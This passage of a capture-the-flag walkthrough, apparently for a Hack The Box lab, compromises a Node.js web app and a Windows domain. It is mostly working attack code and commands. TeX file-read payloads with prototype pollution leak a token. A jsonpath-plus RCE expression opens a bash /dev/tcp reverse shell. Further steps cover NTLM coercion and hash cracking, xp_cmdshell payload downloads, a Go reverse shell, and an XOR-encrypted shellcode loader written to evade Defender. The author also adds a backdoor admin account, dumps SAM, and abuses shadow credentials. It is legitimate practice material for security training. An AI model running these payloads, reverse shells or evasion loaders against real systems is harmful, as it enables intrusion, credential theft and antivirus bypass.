  return r.recordset;
}

async function getTemplate(id) {
  const p = sql.getPool();
  const r = await p.request()
    .input('id', sql.sql.NVarChar(64), id)
    .query('SELECT id, name, scope, owner, version, status, role_tier, body, modified FROM dbo.templates WHERE id=@id');
  return r.recordset[0] || null;
}

async function latestDiagnostics(templateId, limit) {
  const p = sql.getPool();
  const r = await p.request()
    .input('id', sql.sql.NVarChar(64), templateId)
    .input('lim', sql.sql.Int, limit || 5)
    .query(`SELECT TOP (@lim) id, status, stage, last_error_msg, last_warnings, artifact_path, duration_ms, triggered_by, created_at FROM dbo.render_diagnostics WHERE template_id=@id ORDER BY created_at DESC`);
  return r.recordset;
}

async function recordDiagnostics(row) {
  const p = sql.getPool();
  await p.request()
    .input('template_id', sql.sql.NVarChar(64), row.template_id)
    .input('triggered_by', sql.sql.NVarChar(64), row.triggered_by || null)
    .input('status', sql.sql.NVarChar(32), row.status)
    .input('stage', sql.sql.NVarChar(32), row.stage || null)
    .input('last_error_msg', sql.sql.NVarChar(sql.sql.MAX), row.last_error_msg || null)
    .input('last_warnings', sql.sql.NVarChar(sql.sql.MAX), row.last_warnings || null)
    .input('artifact_path', sql.sql.NVarChar(400), row.artifact_path || null)
    .input('duration_ms', sql.sql.Int, row.duration_ms || null)
    .query(`INSERT INTO dbo.render_diagnostics (template_id, triggered_by, status, stage, last_error_msg, last_warnings, artifact_path, duration_ms) VALUES (@template_id, @triggered_by, @status, @stage, @last_error_msg, @last_warnings, @artifact_path, @duration_ms)`);
}

const SAMPLE_REQUEST = {
  id: 'SR-2026-04-1182',
  artifact: 'kernel-driver-nvtsec.sys',
  submitter: 'a.holm',
  pipeline: 'driver-attest-v3',
  risk: 'HIGH',
  submitted: '2026-04-30T08:14:22Z',
};

const SAMPLE_PIPELINE = {
  id: 'firmware-bls',
  defaults: {
    audience: 'internal',
    ceremony_witness: 's.vrana'
  }
};

const SAMPLE_ARTIFACT = {
  lineage: ['build-runner-04 / job 18429', 'src-tag refs/tags/release/2.18', 'compiler clang-19.1.2 (-O2 -fstack-protector-strong)'],
  size: '4.1 MB',
  compiler: 'clang-19.1.2',
};

function spawnWorker(jobDir) {
  return new Promise((resolve) => {
    // Sov-Sec-19 (r.kova, 2026-05-13): pass an explicit minimal env so that a
    // polluted Object.prototype cannot inject vars (e.g. NODE_OPTIONS) into
    // the child via prototype-chain fallback when spawn reads options.env.
    // Sudo's env_reset would normally strip these, but we don't want to rely
    // on the sudoers defaults staying intact.
    const child = spawn('/usr/bin/sudo', ['-n', '-u', RENDER_USER, '/usr/bin/node', RENDER_WORKER, jobDir], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: {
        PATH: '/usr/bin:/bin',
        LANG: 'C.UTF-8'
      },
    });

    let out = '', err = '';
    child.stdout.on('data', (d) => { out += d.toString('utf8'); });
    child.stderr.on('data', (d) => { err += d.toString('utf8'); });

    const timer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch (_) {}
    }, RENDER_TIMEOUT_MS);

    child.on('close', (code) => {
      clearTimeout(timer);
      resolve({ code, out, err });
    });
  });
}

router.get('/admin/templates', requireAdmin, async (req, res) => {
  try {
    const templates = await listTemplates();
    res.render('admin/templates.njk', {
      pageTitle: 'Notice Templates',
      templates
    });
  } catch (e) {
    console.error('templates list error', e);
    res.status(500).send('templates error');
  }
});

router.get('/admin/templates/:id', requireAdmin, async (req, res) => {
  try {
    const tpl = await getTemplate(req.params.id);
    if (!tpl) {
      return res.status(404).render('error.njk', {
        code: 404,
        title: 'Template Not Located',
        detail: 'No such template id.'
      });
    }
    const diagnostics = await latestDiagnostics(tpl.id, 5);
    res.render('admin/template_edit.njk', {
      pageTitle: tpl.id,
      tpl,
      samplePipeline: SAMPLE_PIPELINE.id,
      sampleRequest: SAMPLE_REQUEST,
      diagnostics,
    });
  } catch (e) {
    console.error('templates edit error', e);
    res.status(500).send('templates error');
  }
});

router.post('/admin/templates/:id/save', requireAdmin, async (req, res) => {
  try {
    const tpl = await getTemplate(req.params.id);
    if (!tpl) return res.status(404).json({ ok: false, error: 'no such template' });

    const body = String((req.body && req.body.body) || '');
    const p = sql.getPool();
    await p.request()
      .input('id', sql.sql.NVarChar(64), tpl.id)
      .input('body', sql.sql.NVarChar(sql.sql.MAX), body)
      .input('version', sql.sql.Int, tpl.version + 1)
      .query('UPDATE dbo.templates SET body=@body, version=@version, modified=SYSUTCDATETIME() WHERE id=@id');

    res.json({ ok: true, version: tpl.version + 1 });
  } catch (e) {
    console.error('templates save error', e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

router.post('/admin/templates/:id/render', requireAdmin, async (req, res) => {
  let tpl;
  try {
    tpl = await getTemplate(req.params.id);
    if (!tpl) return res.status(404).json({ ok: false, error: 'no such template' });
  } catch (e) {
    return res.status(500).json({ ok: false, error: e.message });
  }

  // Hand the render to the isolated renderer principal.
  const jobId = 'job-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
  const jobDir = path.join(JOB_ROOT, jobId);

  let overrides = {};
  try {
    if (req.body && typeof req.body.overrides === 'string' && req.body.overrides.trim()) {
      overrides = JSON.parse(req.body.overrides);
    } else if (req.body && req.body.overrides && typeof req.body.overrides === 'object') {
      overrides = req.body.overrides;
    }
  } catch (e) {
    return res.status(400).json({ ok: false, error: 'overrides must be valid JSON: ' + e.message });
  }

  const officer = {
    handle: req.session.userHandle || 'admin',
    clearance: 'Δ-5',
    displayName: req.session.userHandle || 'admin',
  };

  const job = {
    templateId: tpl.id,
    body: (req.body && typeof req.body.body === 'string') ? req.body.body : tpl.body,
    request: SAMPLE_REQUEST,
    officer,
    pipeline: SAMPLE_PIPELINE,
    artifact: SAMPLE_ARTIFACT,
    overrides,
  };

  // Write job spec into a tmpdir that aegis-render can read+write. The dir
  // is created by the worker (it has write perms on /var/lib/aegis-render).
  // We pre-stage the spec via a webadmin-writable handoff dir.
  fs.mkdirSync(jobDir, { recursive: true, mode: 0o775 });
  fs.writeFileSync(path.join(jobDir, 'job.json'), JSON.stringify(job));

  // Allow aegis-render to write into the job dir.
  try { fs.chmodSync(jobDir, 0o777); } catch (_) {}

  const proc = await spawnWorker(jobDir);

  let result;
  try {
    result = JSON.parse(fs.readFileSync(path.join(jobDir, 'result.json'), 'utf8'));
  } catch (e) {
    result = {
      ok: false,
      finalStage: 'worker',
      stages: [{ stage: 'worker', code: proc.code, stderr: proc.err || e.message }]
    };
  }

  const lastStage = (result.stages && result.stages.length) ? result.stages[result.stages.length - 1] : null;
  const errMsg = lastStage ? (lastStage.stderr || '').slice(0, 8000) : '';
  const warnings = (result.stages || [])
    .map((s) => s.stage + ': ' + (s.stderr || '').split('\n').slice(0, 5).join('\n '))
    .join('---\n ')
    .slice(0, 16000);

  await recordDiagnostics({
    template_id: tpl.id,
    triggered_by: req.session.userHandle || ('user##' + req.session.userId),
    status: result.ok ? 'OK' : 'FAILED',
    stage: result.finalStage || (lastStage && lastStage.stage),
    last_error_msg: errMsg,
    last_warnings: warnings,
    artifact_path: result.artifactPath || null,
    duration_ms: result.durationMs || null,
  });

  res.json({
    ok: result.ok,
    finalStage: result.finalStage,
    artifactPath: result.artifactPath || null,
    durationMs: result.durationMs,
    stages: (result.stages || []).map((s) => ({
      stage: s.stage,
      code: s.code,
      durationMs: s.durationMs,
      cmd: s.cmd,
      stderr: (s.stderr || '').slice(-40000),
      stdout: (s.stdout || '').slice(0, 1000),
    })),
  });
});

// Backwards-compat: the existing skeleton calls /preview. Treat it as render.
router.post('/admin/templates/:id/preview', requireAdmin, (req, res, next) => {
  req.url = req.url.replace(/\/preview$/, '/render');
  router.handle(req, res, next);
});

module.exports = router;
```
{% endcode %}

1. **The `overrides` are passed directly to the worker** via `job.json` - no merging happens here
2. **The worker script is** `/home/webadmin/aegis/lib/render_worker.js`
3. **The worker runs as** `aegis-render` user via sudo



**For the last one the mds\_diag.js i dont know i cant open it using my payload so i use the basic one**&#x20;

{% code overflow="wrap" %}
```
{
  "body": "\\input{/home/webadmin/aegis/routes/mds_diag.js}",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}
```
{% endcode %}

{% code overflow="wrap" %}
```java
const express = require('express');
const router = express.Router();
const JSONPath = require('jsonpath-plus');
const sql = require('../db/sql');
const getDb = require('../db/mongo');
const profiles = require('../lib/mds_diag_profiles');

const TOKEN = process.env.MDS_DIAG_TOKEN || '';
if (!TOKEN) console.warn("[mds diag] no token loaded; populate /etc/aegis/mds_diag.env to set MDS_DIAG_TOKEN");

const SNAPSHOT_TTL_MS = parseInt(process.env.MDS_DIAG_SNAPSHOT_TTL_MS || 60000, 10);
const EXPR_MAX = 2000;
const RESULT_CAP = 50;

let _snapshot = null;
let _snapshotAt = 0;

async function loadSnapshot() {
  const coll = getDb().collection('mds_entries');
  const entries = await coll.find({}).limit(2000).toArray();
  return { entries, generatedAt: Date.now() };
}

function validateExpr(expr) {
  if (!expr.length) return 'expr must not be empty';
  if (expr.length > EXPR_MAX) return `expr exceeds ${EXPR_MAX} chars`;
  if (!expr.startsWith('$')) return 'expr must start with $';
  return null;
}

router.post('/api/v1/aegis-mds/_diag/:token/jpquery', express.json({ limit: '1mb' }), async (req, res) => {
  if (req.params.token !== TOKEN) return res.status(401).json({ error: 'bad token' });
  
  const { expr, context } = req.body || {};
  const profile = profiles.find(p => p.scope === (context || 'trust'));
  if (!profile) return res.status(400).json({ error: 'unknown context' });
  
  const validationError = validateExpr(expr);
  if (validationError) return res.status(400).json({ error: validationError });
  
  let snapshot = _snapshot;
  const now = Date.now();
  if (!_snapshot || (now - _snapshotAt) > SNAPSHOT_TTL_MS) {
    snapshot = await loadSnapshot();
    _snapshot = snapshot;
    _snapshotAt = now;
  }
  
  if (context === 'trust') return res.json({ generatedAt: snapshot.generatedAt, context, profile: profile.scope, entries: snapshot.entries });
  
  let matches = [];
  let status = 'ok';
  try {
    matches = JSONPath.JSONPath({ path: expr, json: snapshot.entries, ...DEFAULT_JP_OPTS });
  } catch (e) {
    status = 'error';
    errorDetail = e && e.message ? e.message : String(e);
  }
  
  // Audit logging to MSSQL
  try {
    const pool = sql.getPool();
    await pool.request()
      .input('ctx', sql.sql.NVarChar(64), context)
      .input('expr', sql.sql.NVarChar(sql.sql.MAX), expr.slice(0, EXPR_MAX))
      .input('rcount', sql.sql.Int, matches.length)
      .input('stat', sql.sql.NVarChar(16), status)
      .input('caller', sql.sql.NVarChar(64), (req.ip || '').slice(0, 64))
      .query(`INSERT INTO dbo.mds_diag_audit (ts, context, expr, result_count, status, caller) VALUES (SYSUTCDATETIME(), @ctx, @expr, @rcount, @stat, @caller)`);
  } catch (_) { /* best-effort */ }
  
  return res.json({
    generatedAt: snapshot.generatedAt,
    context,
    profile: profile.scope,
    matchCount: matches.length,
    matches: matches.slice(0, RESULT_CAP),
  });
});

module.exports = router;
```
{% endcode %}

### Critical Vulnerability: JSONPath RCE&#x20;

**The endpoint `/api/v1/aegis-mds/_diag/:token/jpquery` uses `jsonpath-plus` library, which has a known Remote Code Execution vulnerability through crafted JSONPath expressions.**<br>

**so first we extract the token we have the path**&#x20;

{% code overflow="wrap" %}
```
{
  "body": "\\newread\\file \\openin\\file=/etc/aegis-mds-diag.env \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}

MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
```
{% endcode %}

**we will exploiting the unsafe default usage of `eval='safe'` mode**

**so we send a post request on this endpoit  /api/v1/aegis-mds/\_diag/bcdf42b953dcee715b8d81e38f0c5ded/jpquery**

{% code overflow="wrap" %}
```
{
  "expr": "$[?(@.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString())]",
  "context": "audit"
}

{"error":"UnknownContext","detail":"No diagnostic profile registered for context 'audit'.","contexts":["registration","metadata","trust"]}
```
{% endcode %}

{% code overflow="wrap" %}
```
{
  "expr": "$[?(@.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString())]",
  "context": "metadata"
}

{"error":"JpQueryFailure","detail":"jsonPath: Cannot read properties of 2026-07-03T19:48:39.958Z (reading 'constructor'): @.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()"}
```
{% endcode %}

**so to have a better let's search the exact version of jsonpath +**

{% code overflow="wrap" %}
```
{
  "body": "\\newread\\file \\openin\\file=/home/webadmin/aegis/package.json \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}



=\\read2\n! { \"name\": \"aegis\", \"version\": \"0.1.0\", \"private\": true, \"main\": \"server.js\", \"scripts\": { \"start\": \"node server.js\", \"dev\": \"node --watch server.js\" }, \"dependencies\": { \"@simplewebauthn/server\": \"^10.0.1\", \"express\": \"^4.21.0\", \"express-session\": \"^1.19.0\", \"jsonpath-plus\": \"^10.2.0\", \"mongodb\": \"^7.2.0\", \"mssql\": \"^12.5.0\", \"nunjucks\": \"^3.2.4\" } } .\n\\iterate ...\\file to\\myline \\errmessage {\\myline }
```
{% endcode %}

**CVE-2025-1302**

{% code overflow="wrap" %}
```bash
# On burp 

{
  "expr": "$..[?(p=\"console.log(this.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.14.92/9002 0>&1\\\"').toString())\";Ethan=''[['constructor']][['constructor']](p);Ethan())]",
  "context": "metadata"
}


listener 9002
# listening on [any] 9002 ...
# connect to [10.10.14.92] from (UNKNOWN) [10.129.47.110] 61950
# bash: cannot set terminal process group (1467): Inappropriate ioctl for device
# bash: no job control in this shell
webadmin@odyssey-web:~/aegis$
```
{% endcode %}

{% code overflow="wrap" %}
```bash
cat db/sql.js

const config = {
  user: process.env.AEGIS_SQL_USER || 'odyssey_app',
  password: process.env.AEGIS_SQL_PASS || 'opc0932k90%%lODFI93-++',
  server: process.env.AEGIS_SQL_HOST || '172.16.0.11',
  database: process.env.AEGIS_SQL_DB || 'aegis',
  port: parseInt(process.env.AEGIS_SQL_PORT || '1433', 10),
  connectionTimeout: 8000,
  requestTimeout: 15000,
  pool: { max: 10, min: 0, idleTimeoutMillis: 30000 },
  options: {
    encrypt: false,
    trustServerCertificate: true,
    enableArithAbort: true,
  },
};
```
{% endcode %}

<mark style="color:blue;">**Step 7**</mark>

**I am confused becasue we found earlier a creds also for the same hsot but different user however after searching this is a security implementation named "least privs" the audit has list privs**&#x20;

**let's setup ligolo tunnel to access the DB**

{% code overflow="wrap" %}
```bash
getent group sudo
# sudo:x:27:webadmin

sudo su
# i tried both password one of them it work starting with op...
id
# uid=0(root) gid=0(root) groups=0(root)
# i used the same password it works
```
{% endcode %}

{% code overflow="wrap" %}
```bash
cat /etc/hsots 

172.16.0.10 dc01.odyssey.htb dc01
172.16.0.11 odyssey-db.odyssey.htb odyssey-db

# our host on 172.16.0.12 

curl http://10.10.14.92:1234/agent -o agent
chmod +x agent

# On kali
./proxy -selfcert -laddr 0.0.0.0:11601

# On target
nohup ./agent -connect 10.10.14.92:11601 -ignore-cert > /dev/null 2>&1 &

# on ligolo sesesion
session
1 # hit enter 
interface_create --name "ligolo"
interface_add_route --name ligolo --route 172.16.0.0/24
start --tun ligolo
```
{% endcode %}

<mark style="color:blue;">**Step 8**</mark>&#x20;

{% code overflow="wrap" %}
```bash
cat >> scope < EOF
172.16.0.11
172.16.0.10
EOF
sudo nmap --open -iL scope

# Nmap scan report for 172.16.0.11
1433/tcp open  ms-sql-s
5985/tcp open  wsman

# Nmap scan report for 172.16.0.10
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2179/tcp open  vmrdp
3000/tcp open  ppp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```
{% endcode %}

<mark style="color:blue;">**Step 9**</mark>&#x20;

**Pentesting MSSQL**

{% code overflow="wrap" %}
```bash
sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "SELECT name FROM sys.databases; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; SELECT * FROM users;"

master
tempdb
model
msdb
aegis
aegis_audit

user_sessions
users
webauthn_credentials
webauthn_challenges
templates
render_diagnostics
mds_diag_audit

sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "select @@version;"

Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)


sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "SELECT * FROM fn_my_permissions(NULL, 'SERVER');"

server              CONNECT SQL                                                                                                                                                                                                                           
server               VIEW ANY DATABASE                                                                                                                                                                                                                                              


sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "SELECT srvname, isremote FROM sysservers"

odyssey-db   is remote : 1

# Server 'odyssey-db' is not configured for DATA ACCESS.
```
{% endcode %}

**i tried to modify this but am not sysadmin and also i tried i tried everything but nothing including read local file so we try the audit user**

{% code overflow="wrap" %}
```bash
sqlcmd -S 172.16.0.11,1433 -U aegis_audit_publisher -P 'Rxd!Qw6n8sP..2bJ@Wpx-2026' -d aegis_audit -C -Q "SELECT name FROM sys.databases; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; SELECT * FROM users;"

master
tempdb
model
msdb
aegis
aegis_audit

signed_artifact_attestations
notice_render_attestations
audit_ingest_staging

sqlcmd -S 172.16.0.11,1433 -U aegis_audit_publisher -P 'Rxd!Qw6n8sP..2bJ@Wpx-2026' -d aegis_audit -C -Q "SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
entity_name

server           CONNECT SQL                                                                                                                                                                                                                                                  
server           ADMINISTER BULK OPERATIONS                                                                                                                                                                                                                                                 
server           VIEW ANY DATABASE                                                                                                                                                                                                                                                 

# its interesting we have bulk permissions we can read local files
```
{% endcode %}

**so the idea is that we can insert using BULK insert let's try to catch soemthing on responder**&#x20;

{% code overflow="wrap" %}
```bash
sqlcmd -S 172.16.0.11,1433 -U aegis_audit_publisher -P 'Rxd!Qw6n8sP..2bJ@Wpx-2026' -d aegis_audit -C -Q "
SELECT * FROM OPENROWSET(BULK '\\\\10.10.14.92\\share\\test.txt', SINGLE_CLOB) AS x;

sudo responder -I tun0 -dwv
svc-mssql::ODYSSEY:29eac9a020e28f50:CE4FB05785802B62E2F647D322A78612:010100000000000000AE8537A50BDD013BE953ACC25D31480000000002000800390045004700350001001E00570049004E002D005500470034005200330048005300310032004300460004003400570049004E002D00550047003400520033004800530031003200430046002E0039004500470035002E004C004F00430041004C000300140039004500470035002E004C004F00430041004C000500140039004500470035002E004C004F00430041004C000700080000AE8537A50BDD01060004000200000008005000500000000000000000000000003000009DE8AA27D69CE54F4178670BD79685E4A156FFB5D3D382ADB764197BACFCC94238322003336C120C946DA95D6DAAB7E228F610EB840BF3200E7F212527B065F30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000
```
{% endcode %}

**Trying to crack it and its cracked**

{% code overflow="wrap" %}
```bash
cat > svc_mssql.hash << 'EOF'                                                                                           svc-mssql::ODYSSEY:29eac9a020e28f50:CE4FB05785802B62E2F647D322A78612:010100000000000000AE8537A50BDD013BE953ACC25D31480000000002000800390045004700350001001E00570049004E002D005500470034005200330048005300310032004300460004003400570049004E002D00550047003400520033004800530031003200430046002E0039004500470035002E004C004F00430041004C000300140039004500470035002E004C004F00430041004C000500140039004500470035002E004C004F00430041004C000700080000AE8537A50BDD01060004000200000008005000500000000000000000000000003000009DE8AA27D69CE54F4178670BD79685E4A156FFB5D3D382ADB764197BACFCC94238322003336C120C946DA95D6DAAB7E228F610EB840BF3200E7F212527B065F30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000
EOF

hashcat -m 5600 svc_mssql.hash /usr/share/wordlists/rockyou.txt --force
# svc_mssql:cml958782
```
{% endcode %}

<mark style="color:blue;">**Step 10**</mark>&#x20;

**Let's now test this creds on AD**

{% code overflow="wrap" %}
```bash
nxc smb $ip --generate-hosts-file hosts
cat hosts | tee -a /etc/hosts

nxc smb $ip --generate-krb5-file krb5
cp krb5 /etc/krb5.conf

echo $pass | KRB5CCNAME=/tmp/krb5cc_mssql kinit  svc-mssql@ODYSSEY.HTB
export KRB5CCNAME=/tmp/krb5cc_mssql

fake_dc $dc nxc smb $ip -u $user -p $pass
# SMB         172.16.0.10     445    DC01             [+] odyssey.htb\svc-mssql:cml958782

fake_dc $dc bloodhound-python -c all -u $user -p $pass -d $domain -ns $ip --zip

# Nothing interesting on Bloodhound

fake_dc $dc bloodyAD --host $dc -d ODYSSEY.HTB -u $user -p $pass get writable

# Nothing interesting here also 

fake_dc $dc certipy-ad find -u $user -p $pass -dc-ip $ip  --dns-tcp -vulnerable -stdout
# nothing also
```
{% endcode %}

**No shares no anything interesting i enumarate everything the last things having a shell with this SQL server user it can be sysadmin**&#x20;

{% code overflow="wrap" %}
```bash
nxc mssql 172.16.0.11 -u svc-mssql -p 'cml958782' -d odyssey.htb
# MSSQL       172.16.0.11     1433   ODYSSEY-DB       [+] odyssey.htb\svc-mssql:cml958782 (Pwn3d!)
```
{% endcode %}

**It's local admin we see his privs i already deal with that GodPotato if he has Impersonate Privs**

{% code overflow="wrap" %}
```bash
nxc mssql 172.16.0.11 -u svc-mssql -p 'cml958782' -d odyssey.htb -x 'whoami /priv'
# MSSQL       172.16.0.11     1433   ODYSSEY-DB       SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```
{% endcode %}

**I tried to send God-Potato and execute Commands using nxc but it fails howver we will do it with impacket**&#x20;

{% code overflow="wrap" %}
```bash
impacket-mssqlclient 'ODYSSEY/svc-mssql:cml958782@172.16.0.11' -p 1433 -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# On kali
impacket-smbserver share $(pwd) -smb2support -user user -password pass

EXEC xp_cmdshell 'net use Z: \\10.10.14.92\share /user:user pass';

EXEC xp_cmdshell 'copy \\10.10.14.92\share\GodPotato-NET4.exe C:\Users\svc-mssql\Desktop\gp.exe';
# Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```
{% endcode %}

**So we need to use a red team technic to avoid the defender**&#x20;

**We write a go rev shell, we use go to bypass AMSI, no .NET no powershell**&#x20;

{% code overflow="wrap" %}
```go
cd /home/gb05/Desktop/CPTS_PREP/loader
cat > gorevshell.go << 'EOF'
package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
)

func main() {
    // Remplace par ton IP et le port de ton listener
	conn, err := net.Dial("tcp", "10.10.14.92:4444")
	if err != nil {
		return
	}
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		cmd := exec.Command("cmd.exe", "/c", strings.TrimSpace(scanner.Text()))
		out, _ := cmd.CombinedOutput()
		conn.Write(out)
		conn.Write([]byte("SYSTEM> "))
	}
}
EOF
```
{% endcode %}

{% code overflow="wrap" %}
```bash
GOOS=windows GOARCH=amd64 go build -o s.exe -ldflags "-s -w" gorevshell.go
```
{% endcode %}

**Then we generate the shellcode of God-Potato with Donut**&#x20;

{% code overflow="wrap" %}
```bash
/opt/donut/donut -a 2 -i /home/gb05/Desktop/CPTS_PREP/ADtools/GodPotato-NET4.exe -p "-cmd C:\Users\svc-mssql\Desktop\s.exe" -o gp.bin
```
{% endcode %}

**Then we will generate the loader that will read the shellcode and encrypt it using XOR with random key**&#x20;

{% code overflow="wrap" %}
```bash
cat > loader.py << 'EOF'
import secrets

def to_go_bytes(data, name):
    lines = [f"var {name} = []byte{{"]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append("\t" + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    lines.append("}")
    return "\n".join(lines)

# 1. Lire le shellcode brut de Donut
with open("gp.bin", "rb") as f:
    shellcode = f.read()

print(f"[*] Loaded {len(shellcode)} bytes of shellcode from gp.bin")

# 2. Chiffrement XOR avec clé aléatoire
key = secrets.token_bytes(32)
encrypted = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

# 3. Générer le code Go du loader
go_code = f'''package main

import (
	"syscall"
	"unsafe"
)

{to_go_bytes(key, "key")}

{to_go_bytes(encrypted, "enc")}

func main() {{
	// Décryptage en mémoire
	sc := make([]byte, len(enc))
	for i := range enc {{
		sc[i] = enc[i] ^ key[i%len(key)]
	}}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	vAlloc := kernel32.NewProc("VirtualAlloc")
	
	// Allocation en PAGE_READWRITE (0x04) - PAS de RWX !
	addr, _, _ := vAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
	
	// Copie manuelle byte-par-byte (évite les hooks sur RtlCopyMemory/memcpy)
	for i, b := range sc {{
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}}

	// Flip vers PAGE_EXECUTE_READ (0x20) - La page n'est jamais W+X en même temps
	var old uint32
	vProt := kernel32.NewProc("VirtualProtect")
	vProt.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))

	// Exécution via CreateThread
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	
	thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
	waitForSingleObject.Call(thread, 0xFFFFFFFF)
}}
'''

with open("loader.go", "w") as f:
    f.write(go_code)

print(f"[+] Generated loader.go successfully!")
EOF
```
{% endcode %}

{% code overflow="wrap" %}
```bash
python3 loader.py
```
{% endcode %}

**then we compile the loader**

{% code overflow="wrap" %}
```bash
GOOS=windows GOARCH=amd64 go build -o p.exe -ldflags "-s -w" loader.go
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# on kali in 2 terminal
serv 8080
listener 4444

# on the mssql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.92:8080/s.exe -OutFile C:\Users\svc-mssql\Desktop\s.exe"';

EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.92:8080/p.exe -OutFile C:\Users\svc-mssql\Desktop\p.exe"';

EXEC xp_cmdshell 'dir C:\Users\svc-mssql\Desktop\*.exe';
07/05/2026  01:28 PM         1,172,992 p.exe
07/05/2026  01:28 PM         2,172,928 s.exe

EXEC xp_cmdshell 'C:\Users\svc-mssql\Desktop\p.exe';

# on the listenr
connect to [10.10.14.92] from (UNKNOWN) [10.129.48.255] 49309

SYSTEM> whoami
nt authority\system
```
{% endcode %}

<mark style="color:blue;">**Step 11**</mark>&#x20;

**Now we need to pivot to DC01**

{% code overflow="wrap" %}
```powershell
net user hacker Password123! /add
net localgroup Administrators hacker /add
powershell -c "net localgroup 'Remote Management Users' hacker /add"
```
{% endcode %}

{% code overflow="wrap" %}
```bash
evil-winrm -i 172.16.0.11 -u hacker -p 'Password123!'

reg save HKLM\SAM C:\Windows\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y

impacket-secretsdump LOCAL -system system.hive -sam sam.hive -security security.hive
```
{% endcode %}

**we found a machine account hash to verify the MC name  from the authority shell**

{% code overflow="wrap" %}
```powershell
hostname
odyssey-db
```
{% endcode %}

{% code overflow="wrap" %}
```bash
nxc smb 172.16.0.10 -u "ODYSSEY-DB$" -H "71bc6be8565f0c9871070c3912b1680d"
# [+] odyssey.htb\ODYSSEY-DB$:71bc6be8565f0c9871070c3912b1680d
```
{% endcode %}

<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

**We have this ACL we can do shadow creds for this service account**&#x20;

{% code overflow="wrap" %}
```bash
bloodyAD --host DC01.odyssey.htb -d odyssey.htb  --dc-ip 172.16.0.10 -u ODYSSEY-DB$ -p :71bc6be8565f0c9871070c3912b1680d add shadowCredentials "SVC-AEGIS-BUILD"


# svc-aegis-build': bbc270509ec878cf516d5295fb4d774d

export KRB5CCNAME=/home/gb05/Desktop/CPTS_PREP/svc-aegis-build.ccache
nxc smb 172.16.0.10 -u "svc-aegis-build" -k --use-kcache
# [+] ODYSSEY.HTB\svc-aegis-build from ccache

bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get writable

distinguishedName: OU=Migrations,DC=odyssey,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
permission: WRITE
```
{% endcode %}

{% code overflow="wrap" %}
```bash
bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object "OU=Migrations,DC=odyssey,DC=htb"


bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object "CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb"
```
{% endcode %}

**so overlooking each one of them give this**&#x20;

{% code overflow="wrap" %}
```bash
